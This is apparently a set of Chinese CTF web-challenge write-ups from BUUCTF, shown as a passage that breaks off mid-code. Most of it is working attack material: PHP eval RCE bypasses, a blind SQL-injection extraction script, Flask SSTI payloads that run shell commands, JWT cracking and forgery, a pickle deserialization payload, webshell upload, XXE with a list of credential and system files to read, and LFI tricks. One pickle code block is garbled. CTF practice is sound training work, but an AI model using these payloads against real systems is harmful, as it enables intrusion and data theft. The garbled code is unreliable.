    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

如果想得到flag，需要向该页面提交一个c参数，长度不超过80，且限制了很多符号比如常见的空白符号，引号和中括号。同时如果使用函数，函数名必须在白名单中，最终构造好的内容如果通过了限制会被eval执行。很明显，如果要得到flag只靠几个数学函数是没有希望的，需要想办法调用system函数。一种理想的payload是下面这样的：
`c=system("cat /flag")`

但是如何绕过函数和引号的限制呢？引号其实可以删掉，删掉引号命令还是可以执行。对于函数，可以利用动态函数的性质，即字符串做函数名，加上括号即可被当作函数执行：

```
c=($_GET[a])($_GET[b])
```

在上面的例子中，如果a=syetem,b=cat /flag，即可执行system(cat /flag)。

完整的payload如下：
`c=($_GET[a])($_GET[b])&a=system&b=cat /flag`

由于参数只检查c，所以a和b可以随便操作，接下来问题的关键就是，如何绕过c的检查。

白名单用来检测c中出现的变量名，因此a，b不能出现，但是可以用白名单中的值，比如abs，cos。GET中括号和和GET本身都不能出现，中括号可以用{}替代，因此这道题的核心就是构造_GET。构造如下：
`base_convert(37907361743,10,36)(dechex(1598506324))`

```
base_convert(37907361743,10,36)=>"hex2bin"，dechex(1598506324)=>"5f474554",hex2bin("5f474554")=>_GET
```

payload:
`c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&pi=system&abs=cat /flag`

## [极客大挑战 2019]FinalSQL

`异或注入`

正常情况下`id=1`

![image-20231229115035475](./img/14-1.png)

因为`1^0`为`1`

和`id`为`1`时相同

可以根据这个特性，判断后面的注入语句是否正确。经过测试发现mid、union被过滤了，可以考虑这个组合拳：

> ascii(x) ：只取x中第一位的ascii值，这也可以用ord()函数代替。

> substr(string string, int a, int b)：把string从a开始进行截取，截取长度为b。

判断当前数据库名长度，等于4时返回“ERROR”，证明是1^1，语句为真：

> 1^(length(database())=4)

判断数据库第一位的ascii是否大于7，返回“ERROR”，证明是1^1，语句为真：

> 1^(ord(substr(database(),1,1))>7)

判断数据库第一位的ascii是否大于199，返回“NO! Not this! Click others”，证明是1^0，语句为假：

> 1^(ord(substr(database(),1,1))>199)

```python
import requests
# from urllib.parse import urljoin

url = 'http://6db75235-0289-49f2-b368-e488330f1b06.node4.buuoj.cn:81/search.php?id='

def judge_database():
    """ 获取数据库长度 """
    for i in range(20):
        tmp_url = f"{url}0^(length(database())={i})"
        resp = requests.get(tmp_url, timeout=8)
        if "NO! Not this! Click others~~~" in resp.text:
            print(f"Database length is: {i}")
            break
        print(f"try 0^(length(database())={i})")
        
        
def get_database():
    """ 获取数据库名 """
    database = ''
    for i in range(1, 5): # 因为数据库长度为4
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            tmp_url = f"{url}0^(ord(substr(database(),{i},1))<{mid})"
            # print(tmp_url, low, high)
            resp = requests.get(tmp_url, timeout=8)
            if "NO! Not this! Click others~~~" in resp.text:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        database += chr(mid - 1)
    print(f"Database is: {database}")
    
    
def get_tables_length():
    """ 获取表名长度 """
    for i in range(20):
        tmp_url = f"{url}0^((select(length(group_concat(table_name)))from(information_schema.tables)where(table_schema='geek'))={i})"
        print(tmp_url)
        resp = requests.get(tmp_url, timeout=8)
        if "NO! Not this! Click others~~~" in resp.text:
            print(f"Table length is: {i}")
            break
        
def get_tables():
    """ 获取表名 """
    tables = ''
    for i in range(1, 17): # 因为表长度为16
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            tmp_url = f"{url}0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),{i},1))<{mid})"
            print(tmp_url, low, high)
            resp = requests.get(tmp_url, timeout=8)
            if "NO! Not this! Click others~~~" in resp.text:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        tables += chr(mid - 1)
        print(tables)
    print(f"Tables is: {tables}")
    
    
def get_column_length(table_name='Flaaaaag'):
    """ 判断列名长度 """
    for i in range(40):
        tmp_url = f"{url}0^((select(length(group_concat(column_name)))from(information_schema.columns)where(table_name='{table_name}'))={i})"
        print(tmp_url)
        resp = requests.get(tmp_url, timeout=8)
        if "NO! Not this! Click others~~~" in resp.text:
            print(f"Column length is: {i}")
            break
        
        
def get_columns_name(table_name='Flaaaaag', column_length=16):
    """ 获取列名 """
    columns = ''
    for i in range(1, column_length + 1): # 因为表长度为16
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            tmp_url = f"{url}0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='{table_name}')),{i},1))<{mid})"
            print(tmp_url, low, high)
            resp = requests.get(tmp_url, timeout=8)
            if "NO! Not this! Click others~~~" in resp.text:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        columns += chr(mid - 1)
        print(columns)
    print(f"Column is: {columns}")
    
def get_flag_value():
    column_values = ''
    for i in range(1, 17): # 因为表长度为16
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            tmp_url = f"{url}0^(ord(substr((select(group_concat(fl4gawsl))from(Flaaaaag)),{i},1))<{mid})"
            print(tmp_url, low, high)
            resp = requests.get(tmp_url, timeout=8)
            if "NO! Not this! Click others~~~" in resp.text:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        column_values += chr(mid - 1)
        print(column_values)
    print(f"value is: {column_values}")
    
    
def get_all_column_length(column_name='password', table_name='F1naI1y'):
    """ 获取列长度 """
    for i in range(300):
        tmp_url = f"{url}0^((select(length(group_concat({column_name})))from({table_name}))={i})"
        print(tmp_url)
        resp = requests.get(tmp_url, timeout=8)
        if "NO! Not this! Click others~~~" in resp.text:
            print(f"All Column length is: {i}")
            break
    
def get_final_flag_value():
    column_values = ''
    for i in range(1, 300):
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            tmp_url = f"{url}0^(ord(substr((select(group_concat(username,password))from(F1naI1y)),{i},1))<{mid})"
            print(tmp_url, low, high)
            resp = requests.get(tmp_url, timeout=8)
            if "NO! Not this! Click others~~~" in resp.text:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        column_values += chr(mid - 1)
        print(column_values)
    print(f"value is: {column_values}")
    
    
if __name__ == '__main__':
    # judge_database()
    # get_database()
    # get_tables_length()
    # get_tables()
    # get_column_length()
    # get_columns_name()
    # get_flag_value()  # 没在那个表里 重新查表
    # get_column_length('F1naI1y')
    # get_columns_name('F1naI1y', 20)
    # get_all_column_length()
    get_final_flag_value()
```

## [Zer0pts2020]Can you guess it?

```php
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Can you guess it?</title>
  </head>
  <body>
    <h1>Can you guess it?</h1>
    <p>If your guess is correct, I'll give you the flag.</p>
    <p><a href="?source">Source</a></p>
    <hr>
<?php if (isset($message)) { ?>
    <p><?= $message ?></p>
<?php } ?>
    <form action="index.php" method="POST">
      <input type="text" name="guess">
      <input type="submit">
    </form>
  </body>
</html>
```

```php
$secret = bin2hex(random_bytes(64));
```

需要猜对`$secret`才能获得`flag`

![臣妾做不到啊](img/buuctf/1.jpg)

换一种思路，从这里入手

```php
if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}
```

从上面的代码看，`flag`应该是在`config.php`中

首先要传入`source`变量，直接`?source`即可
然后`basename($_SERVER['PHP_SELF'])`
我们传入`/index.php/config.php`即可
`basename($_SERVER['PHP_SELF'])`即会返回`config.php`
但是会被上方的`preg_match`匹配到就直接`exit`
所以需要想办法绕过
我们可以利用空字符串绕过正则：`basename()`会去掉不可见字符，使用超过`ascii`码范围的字符就可以绕过
所以最终payload为
`/index.php/config.php/%ff?source`

[参考文章](https://www.shawroot.cc/937.html)

## [CSCCTF 2019 Qual]FlaskLight

### 知识点

`flask 模板注入`

`Python中subprocess.Popen、class 'site._Printer'、warnings.catch_warnings 模块、config 的运用`

![FlaskLight1](img/15-1.png)

需要我们传一个参数

那我们就传一个`search`参数

测`{{8+8}}`服务器会返回错误，测`{{8*8}}`返回`64`

发现`search`参数存在`SSTI`漏洞

#### 方法一：subprocess.Popen

关于subprocess.Popen

subprocess这个模块是用来产生子进程，然后可以连接到这个子进程传入值并获得返回值

subprocess中的Popen类，这个类中可以传入一些参数值

```python
class subprocess.Popen( 
 args,      -- 字符串或者列表，表示要执行的命令如：
    subprocess.Popen(["cat","test.txt"])或subprocess.Popen("cat test.txt", shell=True)
 bufsize=0,     -- 缓存大小，0无缓冲，1行缓冲
 executable=None,   -- 程序名，一般不用
 stdin=None,    -- 子进程标准输入
 stdout=None,    -- 输出
 stderr=None,    -- 错误
 preexec_fn=None,
 close_fds=False,
 shell=False,    -- 为ture的时候，unix下相当于args前添加了一个 /bin/sh -c
          --    window下相当于添加 cmd.exe /c
 cwd=None,     -- 设置工作目录
 env=None,     -- 设置环境变量
 universal_newlines=False, -- 各种换行符统一处理成 \n
 startupinfo=None,   -- window下传递给createprocess的结构体
 creationflags=0)   -- window下传递create_new_console创建自己的控制台窗口
```

[参考地址](https://www.cnblogs.com/zhoug2020/p/5079407.html)

关于Popen.communicate()

communicate()：和子进程交互，发送和读取数据

> communicate()：和子进程交互，发送和读取数据

> 使用 subprocess 模块的 Popen 调用外部程序，如果 stdout 或 stderr 参数是 pipe，并且程序输出超过操作系统的 pipe size时，如果使用 Popen.wait() 方式等待程序结束获取返回值，会导致死锁，程序卡在 wait() 调用上 ulimit -a 看到的 pipe size 是 4KB，那只是每页的大小，查询得知 linux 默认的 pipe size 是 64KB。

使用 Popen.communicate()。这个方法会把输出放在内存，而不是管道里，

所以这时候上限就和内存大小有关了，一般不会有问题。而且如果要获得程序返回值，

可以在调用 Popen.communicate() 之后取 Popen.returncode 的值。

[参考地址](https://blog.csdn.net/carolzhang8406/article/details/22286913])

首先列出对象的属性，找到`object`的位置

```python
{{''.__class__}}
```

`<type 'str'>`

```python
{{''.__class__.__mro__}}
```

`(<type 'str'>, <type 'basestring'>, <type 'object'>)`

```python
{{''.__class__.__mro__[2].__subclasses__()}}
```

然后找到`<class 'subprocess.Popen'>`的下标位置

```python
import requests
import html
import re

url = "http://f152e458-fb49-4008-8136-2d0add19885e.node5.buuoj.cn:81?search={{''.__class__.__mro__[2].__subclasses__()【258}}"

resp = requests.get(url)
content = html.unescape(resp.text)

res = re.findall("<h3>(.*?)</h3>", content)
r = res[0].split(',')
for i, v in enumerate(r):
    if 'subprocess.Popen' in v:
        print(i)
```

运行结果为`258`

```url
?search={{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
```

```url
?search={{''.__class__.__mro__[2].__subclasses__()[258]('cat flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}
```

#### 方法二: warnings.catch_warnings

使用列表，通过列表获取`object`的所有属性。`__base__`获取所继承的基类名

```url
?search={{[].__class__.__base__}}
```

`<type 'object'>`

```url
?search={{[].__class__.__base__.__subclasses__()}}
```

使用之前的脚本修改后查找`warnings.catch_warnings`的索引值

```python
import requests
import html
import re

url = "http://32782db1-4d7e-4680-83e2-be76f41a21f9.node5.buuoj.cn:81/?search={{[].__class__.__base__.__subclasses__()}}"

resp = requests.get(url)
content = html.unescape(resp.text)

res = re.findall("<h3>(.*?)</h3>", content)
r = res[0].split(',')
for i, v in enumerate(r):
    if 'warnings.catch_warnings' in v:
        print(i)
```

返回值为`59`

```url
?search={{[].__class__.__base__.__subclasses__()[59]}}
```

返回`<class 'warnings.catch_warnings'>`后继续

这个`warnings.catch_warnings`是不含`os`模块的类，所以在使用的时候需要`import os`模块

找到位置后通过`__init__`进行初始化，然后使用`__globals__`获得全局变量，在使用`__builtins__`内键命名空间，运行一个`eval`对象，参数为`__import__('os').popen('ls').read()`，意思为导入`os`模块然后使用`popen()`方法执行命令，这个方法还有两个可选参数，分别为文件读取权限的模式（默认为 `r` ）、缓冲大小，最后通过`read()`方法读取内容，`read()`方法不传入参数默认读取所有

其中需要注意的是`globals`这个单词放一起会被过滤掉，需要使用拼接方式绕过

```url
?search={{[].__class__.__base__.__subclasses__()[59].__init__}}
```

返回`<unbound method catch_warnings.__init__>`

```url
?search={{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']}}
```

![init globals result](./img/15-2.png)

```url
?search={{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']}}
```

![init builtins result](./img/15-3.png)

```url
?search={{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']}}
```

返回`<built-in function eval>`

```url
?search={{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
或者
?search={{[].__class__.__mro__[1].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
```

返回`bin boot dev etc flasklight home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var`
即可正常读取`flag`

```url
?search={{[].__class__.__mro__[1].__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('cat flasklight/coomme_geeeett_youur_flek').read()")}}
```

#### 方法三：site._Printer

前面同样的需要获取到所有类的属性，不过这次需要找到class 'site._Printer'的下标位置

```python
import requests
import html
import re

url = "http://32782db1-4d7e-4680-83e2-be76f41a21f9.node5.buuoj.cn:81/?search={{[].__class__.__base__.__subclasses__()}}"

resp = requests.get(url)
content = html.unescape(resp.text)

res = re.findall("<h3>(.*?)</h3>", content)
r = res[0].split(',')
for i, v in enumerate(r):
    if 'site._Printer' in v:
        print(i)
```

得到索引为`71`

关于`class 'site._Printer'`这个类，这个类是内含`os`模块的，所以可以直接使用`os`模块，然后使用`popen()`方法执行命令，使用`read()`方法获取其返回值，这里也是同样`globals`被过滤掉了

```url
?search={{[].__class__.__mro__[1].__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}}
```

```url
?search={{[].__class__.__mro__[1].__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat flasklight/coomme_geeeett_youur_flek').read()}}
```

即可获取`flag`

#### 方法四 config

直接输入`config`会发现有返回值

```url
?search={{config}}
```

![Config 1](img/15-4.png)

然后可以直接通过`config`初始化一个全局变量然后在使用`os`模块、`popen()`方法执行命令`read()`读取值

```url
?search={{config.__init__['__glo'+'bals__']['os'].popen('ls').read()}}
```

```url
?search={{config.__init__['__glo'+'bals__']['os'].popen('cat flasklight/coomme_geeeett_youur_flek').read()}}
```

## [CISCN2019 华北赛区 Day1 Web2]ikun

`pickle`
`python`

进入题目首页

![1Kun 1](img/16-1.png)

要求冲到`lv6`

翻了几页没看见，用`python`脚本找一下

```python
import requests

for i in range(1, 200):
    url = f"http://84eb6b56-3cf8-4b61-91fd-02bd6f875a03.node5.buuoj.cn:81/shop?page={i}"
    resp = requests.get(url)
    print(i, flush=True)
    if 'lv6.png' in resp.text:
        print(f"find -> {i}")
        break
```

运行结果为`180`

![1Kun 2](img/16-2.png)

发现了`lv6`的购买链接，`burpsuite`抓包看看

![1Kun 3](img/16-3.png)

发现下面的`discount`即为折扣值

修改成功跳转后发现要求`admin`才能登录

发现`JWT`有签名，尝试破解一下

使用`jwt_tool`的字典破解

```bash
python3 .\jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNjYyJ9.J2bFVzLD9m-41Jq8Z4J-FAB-8Kx04DqrvTcxQM521O4 -C -d .\top19576.txt
```

![Alt text](img/16-6.png)

得到`secret`为`1Kun`

或者使用`jwtcrack`获取`secret`

![Alt text](img/16-8.png)

`Cyberchef`解密结果

![Alt text](img/16-7.png)

使用`python`生成`jwt`

```python
# coding=utf-8
import hmac
import hashlib
import base64

key = '1Kun'

header = '{"alg": "HS256","typ": "JWT"}'
payload = '{"username": "admin"}'

encodeHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodeHeader = str(encodeHBytes, "utf-8").rstrip("=")

encodePBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodePayload = str(encodePBytes, "utf-8").rstrip("=")

token = (encodeHeader + "." + encodePayload)


sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"), token.encode("utf-8"), hashlib.sha256).digest()).decode("UTF-8").rstrip("=")

print(token + "." + sig)
```

运行结果为`eyJhbGciOiAiSFMyNTYiLCJ0eXAiOiAiSldUIn0.eyJ1c2VybmFtZSI6ICJhZG1pbiJ9.iRc4KyWA0et3DmhK0nFu7aznKWxX6KuXJhisec_QUtY`

放入`Cookie`中可以发现用户名已经变为`admin`

![Alt text](img/16-9.png)

再到`burpsuite`中进行购买`lv6`

购买的时候发现了隐藏信息

![Alt text](img/16-11.png)

在下载的文件里发现了`pickle`反序列化，那么就可以利用`pickle`反序列化执行命令了

![Alt text](img/16-12.png)

```python
import pickle
import urllib
import commands

class A(object):
    def __reduce__(self):
`ccommands%0Agetoutput%0Ap0%0A%28S%27cat%20/flag.txt%27%0Ap1%0Atp2%0ARp3%0A.`        # return (eval, ("__import__('os').system('ls')",))


        # return (commands.getoutput, ("ls /",))
        return (commands.getoutput, ("cat /flag.txt",))
 
a = A()
s = pickle.dumps(a)
print(urllib.quote(s))
```

`python2`运行后为

`ccommands%0Agetoutput%0Ap0%0A%28S%27cat%20/flag.txt%27%0Ap1%0Atp2%0ARp3%0A.`

![pickle](./img/16-13.png)

放到`burpsuite`的`become`参数即可

![pickle](./img/16-14.png)

# [WUSTCTF2020]CV Maker

注册账号时发现抱报错，但是没找到有用的信息

![CV Maker1](img/17-1.png)

登录试试，发现头像处有上传点，尝试上传`webshell`

![CV Maker2](img/17-2.png)

![CV Maker2](img/17-3.png)

简单上传一个马 头像处发生改变 查看一下头像信息 `ctrl+shift+c`选中头像

![CV Maker3](img/17-4.png)

![CV Maker4](img/17-5.png)

发现可直接利用`webshell`，执行命令获取`flag`即可

![CV Maker3](img/17-6.png)

# [GWCTF 2019]枯燥的抽奖

`php代码审计`

`mt_srand`

题目首页

![抽奖1](img/18-1.png)

源代码中发现`check.php`,看一下`check.php`

```php
AmUOxzUxpB

<?php
#这不是抽奖程序的源代码！不许看！
header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}

mt_srand($_SESSION['seed']);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";


if(isset($_POST['num'])){
    if($_POST['num']===$str){x
        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
    }
    else{
        echo "<p id=flag>没抽中哦，再试试吧</p>";
    }
}
show_source("check.php");
```

发现漏洞点在`mt_srand`上,`mt_srand()`函数的作用是给随机数发生器播种，播种会初始化随机数生成器。语法为`mt_srand(seed)`，其`seed`参数为必须。大多数随机数生成器都需要初始种子。在`PHP`中，因为自动完成，所以`mt_srand()`函数的使用是可选的。从 `PHP 4.2.0` 版开始，`seed` 参数变为可选项，当该项为空时，会被设为随时数。播种后`mt_rand`函数就能使用`Mersenne Twister`算法生成随机整数。

但是用这个函数时会存在一些问题，每一次调用`mt_rand()`函数的时候，都会检查一下系统有没有播种,(播种是由`mt_srand()`函数完成的)，当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以同一个种子下随机生成的随机数值是相同的。同时，也解释了我们破解随机种子的可行性。如果每次调用`mt_rand()`函数都需要生成一个随机种子的话，那根本就没办法破解。

但现在因为种子值可破解，将目前已知的字符去反推`seed`，首先使用`python`转为`php_mt_seed`可以处理的数据，再利用`php_mt_seed`反推

[参考文章](https://www.cnblogs.com/l0vehzzz/p/16452542.html)

```python
str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
str2='AmUOxzUxpB'
res=''
for i in range(len(str2)):  
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '
            break
print(res)
```

![Alt text](img/18-3.png)

![Alt text](img/18-4.png)

发现`seed`值为`390951860`,根据之前的源码生成字符串并检验

```php
<?php

mt_srand(390951860);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);
}
$str_show = substr($str, 0, 20);
echo "<p id='p1'>".$str_show."</p>";
```

![Alt text](img/18-5.png)

# [红明谷CTF 2021]write_shell

`php代码审计`

`waf绕过`

题目源码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
?>
```

过滤了`php`,`空格`，写入文件内容时可以用`<?=`绕过`<?php`，里面的内容可以用`.`绕过，如`ph.pinfo`,，`;`被过滤掉了,只执行一条语句即可,`空格`可以用`%09`(tab)绕过

```url
/?action=upload&data=<?=(ph.pinfo)()?>
```

![Alt text](img/19-1.png)

![Alt text](img/19-2.png)

```url
?action=upload&data=<?=system("ls%09/")?>
或者
/?action=upload&data=`cat%09/flllllll1112222222lag`?>
```

![Alt text](img/19-3.png)

```url
?action=upload&data=<?=system("cat%09/flllllll1112222222lag")?>
```

![Alt text](img/19-4.png)

[参考文章](https://www.shawroot.cc/1897.html)

# [NCTF2019]True XML cookbook

`XXE`

在登录框中发现`用户名`会正常返回到请求包中

在尝试登录功能时可以看到请求与响应包的携带的数据都是XML格式，并且返回包中的msg标签值与请求包中的username标签值相同。尝试使用XXE，数据注入点在username标签

常用读取敏感文件

```path
/etc/passwd
/etc/shadow
/etc/hosts
/root/.bash_history //root的bash历史记录
/root/.ssh/authorized_keys
/root/.mysql_history //mysql的bash历史记录
/root/.wget-hsts
/opt/nginx/conf/nginx.conf //nginx的配置文件
/var/www/html/index.html
/etc/my.cnf
/etc/httpd/conf/httpd.conf //httpd的配置文件
/proc/self/fd/fd[0-9]*(文件标识符)
/proc/mounts
/porc/config.gz
/proc/sched_debug // 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用
/proc/mounts // 挂载的文件系统列表
/proc/net/arp //arp表，可以获得内网其他机器的地址
/proc/net/route //路由表信息
/proc/net/tcp and /proc/net/udp // 活动连接的信息
/proc/net/fib_trie // 路由缓存
/proc/version // 内核版本
/proc/[PID]/cmdline // 可能包含有用的路径信息
/proc/[PID]/environ // 程序运行的环境变量信息，可以用来包含getshell
/proc/[PID]/cwd // 当前进程的工作目录
/proc/[PID]/fd/[#] // 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log
ssh
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/root/.ssh/authorized_keys
/etc/ssh/sshd_config
/var/log/secure
/etc/sysconfig/network-scripts/ifcfg-eth0
/etc/syscomfig/network-scripts/ifcfg-eth1
```

使用`base64`读取

![Alt text](img/20-3.png)

读取`/etc/hosts`文件

![Alt text](img/20-2.png)

![Alt text](img/20-4.png)

说是有个`ip`

`<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://173.218.210.10">]>`

但我没找到 估计是环境问题

# [RCTF2015]EasySQL

首页为注册界面

![Alt text](img/21-1.png)

注册一个新用户，登入进去可以修改密码，应该是二次注入

注册时`fuzz`发现部分字符被过滤

![Alt text](img/21-2.png)

![Alt text](img/21-3.png)

在`Change password`时显示报错，则可以使用报错注入

![Alt text](img/21-4.png)

则可推断出这部分的`sql`语句

`update user set password='xxx' where username="xxxx" and pwd='202cb962ac59075b964b07152d234b70'`

方法一: updatexml注入

获取表

```sql
admin"^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#
```

![Alt text](img/21-6.png)

![Alt text](img/21-7.png)

![Alt text](img/21-8.png)

获取列名

```sql
admin"^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),0x7e),1)#
```

![Alt text](img/21-9.png)

获取flag内容

```sql
admin"^updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag)),0x7e),1)#
```

![Alt text](img/21-10.png)

是个假的`flag`,再找找其他表

```sql
admin"^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),0x7e),1)#
```

![Alt text](img/21-11.png)

但是要输出数据的时候提示没有存在该列，可以推测该列没有被完全输出

可以用`regexp`正则来匹配

因为`&`在`burpsuite`中会被识别为传参，所以需要`url编码`

![Alt text](img/21-13.png)

![Alt text](img/21-12.png)

```sql
admin"^updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1)#
```

![Alt text](img/21-14.png)

右边的`~`都还没出来，还是`regexp`来找`flag`

```sql
admin"^updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')),0x7e),1)#
```

![Alt text](img/21-15.png)

 打印出了前面的`flag`，后面还没显示出来，可以用`reverse`逆序输出`flag`

```sql
admin"^updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))),0x7e),1)#
```


# [CISCN2019 华北赛区 Day1 Web5]CyberPunk

`文件包含`
`LFI`
`sql注入`

进入首页后在源代码处找到了隐藏信息

![Alt text](img/22-1.png)

`LFI`读取文件

```url
?file=php://filter/convert.base64-encode/resource=
```

`index.php`

```php
<?php

ini_set('open_basedir', '/var/www/html/');

// $file = $_GET["file"];
$file = (isset($_GET['file']) ? $_GET['file'] : null);
if (isset($file)){
    if (preg_match("/phar|zip|bzip2|zlib|data|input|%00/i",$file)) {
        echo('no way!');
        exit;
    }
    @include($file);
}
?>
```

`search.php`

```php
<?php

require_once "config.php"; 

if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        if(!$row) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "<p>姓名:".$row['user_name']."</p><p>, 电话:".$row['phone']."</p><p>, 地址:".$row['address']."</p>";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```

`change.php`

```php
<?php

require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = addslashes($_POST["address"]);
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
